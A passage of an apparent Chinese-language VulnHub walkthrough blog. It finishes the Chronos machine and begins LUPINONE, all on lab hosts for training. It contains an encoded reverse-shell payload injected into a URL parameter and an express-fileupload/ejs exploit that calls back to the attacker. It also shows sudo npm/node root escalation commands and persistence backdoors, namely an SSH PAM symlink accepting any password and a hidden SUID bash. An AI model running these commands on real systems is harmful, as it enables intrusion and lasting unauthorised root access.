&lt;p&gt;在 CyberChef 上获取到反弹 shell 的 base58 加密的字符&lt;br&gt;
 U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PUwNR&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-276.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;拼接到 url 地址中，并且监听本地的 4445 端口，等待 shell&lt;br&gt;
 等同于访问 http://chronos.local:8000/date?format=U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PuwNR&lt;br&gt;
 并修改 UA 为 Chronos&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-277.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接收到shell之后，使用python3 改为一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-278.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo - l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh `which pkexec`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls /opt &amp;amp;&amp;amp; ls /var &amp;amp;&amp;amp; ls /home&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现服务器上无权限设置的错误，也不能利用 pkexec&lt;br&gt;
 进行提权，id 组也没有设置错误，没有 suid 的错误权限可利用文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-279.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;express-fileupload提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#express-fileupload提权&#34;&gt;#&lt;/a&gt; express-fileupload 提权&lt;/h3&gt;
&lt;p&gt;继续翻阅文件，查找的一个 chronos-v2 的文件夹，找到 server.js 中有 express-fileupload 的调用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-280.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接用谷歌搜索是否存在此组件的漏洞，果然找到了一个 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-281.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 github 上找到了 ejs 利用的代码，复制此 payload&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-282.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将 payload 中的参数进行修改，反弹主机 ip 和端口，以及 ejs 的端口号&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-283.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启简易 web 服务，将此文件下载到目标靶机上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-284.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目标靶机通过运行 ejs.py 文件，shell 成功被反弹&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用python，&lt;span class=&#34;built_in&#34;&gt;stty&lt;/span&gt;得到一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-285.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;sudonpmnode提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonpmnode提权&#34;&gt;#&lt;/a&gt; sudo (npm/node) 提权&lt;/h3&gt;
&lt;p&gt;查看相关权限的设置，发现 npm，node 都可以提权&lt;br&gt;
在 https://gtfobins.github.io/ 上找到提权命令进行提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;npm 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo npm exec /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;node 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo node -e &amp;#x27;child_process.spawn(&amp;quot;/bin/sh&amp;quot;, &amp;#123;stdio: [0, 1, 2]&amp;#125;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-286.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获取到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;ssh-pam-软链接维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-pam-软链接维权&#34;&gt;#&lt;/a&gt; SSH PAM 软链接维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 靶机上执行：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查端口号看是否命令是否执行成功：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps aux | grep 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -tanlp | grep 12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-287.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 攻击机执行：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接着输入任意密码就可以root用户权限登陆了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实际测试中发现，如果 root 用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：&lt;br&gt;
ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmltZXJhQDE5Mi4xNjguMzEuMjM4&#34;&gt;imera@192.168.31.238&lt;/span&gt; -p 12345 接着输入任意密码就可以 imera 用户权限登陆了&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在ssh的配置文件中开启root登陆，是否可以解决无法用root登陆的问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/ssh/sshd_config | grep PermitRootLogin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/ssh/sshd_config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service ssh restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-288.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 并不能直接登陆到 root 账户，需要其他的设置进入 root 账户&lt;/p&gt;
&lt;h3 id=&#34;suid-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-权限维持&#34;&gt;#&lt;/a&gt; SUID 权限维持&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;制作隐藏的SUID文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 4755 /var/.hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-289.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接靶机并用SUID文件提权至root&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh imera@192.168.31.238 -p 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/.hack -p &amp;amp; whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 维持到了 root，现用 imera 登陆，再用 /var/.hack 提权&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/116%20LUPINONE/</guid>
            <title>VULNHUB 16 LUPINONE</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/116%20LUPINONE/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWx1cGlub25lLDc1MC8=&#34;&gt;https://www.vulnhub.com/entry/empire-lupinone,750/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDAzMTg0L2FydGljbGUvZGV0YWlscy8xMjI3NjY0ODM=&#34;&gt;https://blog.csdn.net/qq_45403184/article/details/122766483&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 LUPINONE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-331.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.236&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.236&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-332.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTM2&#34;&gt;http://192.168.31.136&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-333.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个没有任何可以点击的单纯的页面，并且审查源代码没有任何提示&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.236 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-334.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫描到了 robots.txt 这个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-335.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到一个提示 /～myfiles&lt;/p&gt;
&lt;h3 id=&#34;wfuzz-模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-模糊测试&#34;&gt;#&lt;/a&gt; wfuzz 模糊测试&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可能隐藏的含义是，一个缺少参数的后门文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~myfiles/?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;扫描是否存在 http://192.168.31.236/~myfiles/?FUZZ=xx&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-336.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;返回结果全是 200 即表示不存在拼接参数&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可能是一个目录结构，首字符为～的形式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;扫描是否存在 http://192.168.31.236/～FUZZ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-337.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;返回结果都是 404&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;过滤掉 404 继续扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list-2.3-medium.txt | grep -v 404&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-338.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫到了一个特殊的目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQ=&#34;&gt;http://192.168.31.236/~secret&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-339.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 提示有一个 ssh 私钥文件隐藏在这个目录下，并且需要 fasttrack 这个字典，有一个用户叫做 icex64&lt;/p&gt;
&lt;h3 id=&#34;burp-加载字典爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-加载字典爆破&#34;&gt;#&lt;/a&gt; burp 加载字典爆破&lt;/h3&gt;
&lt;p&gt;burp 做代理，拦截浏览器请求，识别是否存在隐藏文件.a.txt 的文件将 a 与 txt 作为变量，进行多次重发数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-340.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;选择字典，第一个字典我选用的是 kali 中的 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-341.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第二个字典是几种比较可能的私钥文件后缀:.txt,.pub,.html,.cer,.pem,.der,.key&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-342.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据装载完毕，开始爆破&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-343.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 唯一返回的 200 状态码的是 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==&#34;&gt;http://192.168.31.236/~secret/.mysecret.txt&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ffuf-模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf-模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
